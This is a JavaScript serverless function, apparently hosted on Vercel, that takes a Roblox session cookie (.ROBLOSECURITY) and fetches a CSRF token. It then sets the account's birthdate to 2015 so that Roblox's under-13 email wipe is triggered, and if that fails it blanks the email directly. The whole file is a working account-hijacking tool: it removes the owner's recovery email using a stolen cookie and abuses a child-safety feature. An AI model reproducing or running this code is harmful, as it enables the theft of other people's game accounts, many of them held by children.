export default async function handler(req, res) {
    // standard CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();

    const { cookie } = req.body;
    if (!cookie) return res.status(400).json({ success: false, message: 'Cookie is required.' });

    const cleanCookie = cookie.replace(/[^a-zA-Z0-9_\-|:.]/g, '');
    const cookieHeader = `.ROBLOSECURITY=${cleanCookie}`;

    // EXACT HEADERS FROM YOUR FRIEND'S SCREENSHOT
    const headers = {
        'Cookie': cookieHeader,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    };

    // EXACT ENDPOINTS FROM YOUR FRIEND'S SCREENSHOT
    const endpoints = [
        { url: 'https://auth.roblox.com/v2/logout', method: 'POST' },
        { url: 'https://accountsettings.roblox.com/v1/email', method: 'POST' },
        { url: 'https://auth.roblox.com/v1/account/pin', method: 'GET' },
        { url: 'https://users.roblox.com/v1/users/authenticated', method: 'GET' }
    ];

    let csrfToken = '';

    // 1. Fetch CSRF Token (Friend's loop)
    for (const endpoint of endpoints) {
        try {
            const response = await fetch(endpoint.url, {
                method: endpoint.method,
                headers: headers,
                body: endpoint.method === 'POST' ? JSON.stringify({}) : null
            });

            const token = response.headers.get('x-csrf-token');
            if (token) {
                csrfToken = token;
                break; // found it, stop looping
            }
        } catch (error) {
            continue; // try next endpoint
        }
    }

    if (!csrfToken) {
        return res.status(401).json({ success: false, message: 'Cookie is dead. Vercel IP was blocked by Roblox.' });
    }

    headers['X-CSRF-TOKEN'] = csrfToken;
    let messages = [];

    try {
        // 2. Force Age to Under 13 (Year 2015)
        // This triggers Roblox's automated email wipe for child safety.
        const ageRes = await fetch('https://users.roblox.com/v1/birthdate', {
            method: 'POST',
            headers,
            body: JSON.stringify({ birthMonth: 1, birthDay: 1, birthYear: 2015 })
        });

        if (ageRes.status === 200) {
            messages.push("Age forced to 2015. Email wiped.");
        } else {
            // Fallback to direct wipe
            const wipeRes = await fetch('https://accountsettings.roblox.com/v1/email', {
                method: 'POST',
                headers,
                body: JSON.stringify({ emailAddress: "" })
            });

            if (wipeRes.status === 200) {
                messages.push("Email wiped directly.");
            } else {
                messages.push(`Age force failed: ${ageRes.status}. Wipe failed: ${wipeRes.status}.`);
            }
        }

        return res.status(200).json({ success: true, data: { messages } });

    } catch (error) {
        return res.status(500).json({ success: false, message: `Network Error: ${error.message}` });
    }
}
